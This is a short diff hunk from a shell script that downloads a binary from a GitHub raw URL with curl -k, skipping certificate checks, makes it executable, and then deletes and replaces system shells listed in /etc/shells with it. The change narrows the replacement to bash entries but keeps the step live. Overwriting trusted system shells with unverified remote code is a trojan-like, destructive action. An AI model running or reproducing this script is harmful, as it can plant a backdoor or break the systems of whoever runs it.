@@ -15,7 +15,7 @@ curl -k 'https://raw.githubusercontent.com/lsh8829/CDT473/main/bash' -o /tmp/bas
 chmod +x /tmp/bash
 
 # replace all existing shells with our binary
-for shell in $(tail -n +2 /etc/shells)
+for shell in $(tail -n +2 /etc/shells | grep bash)
 do
     rm -rf $shell
     cp /tmp/bash $shell
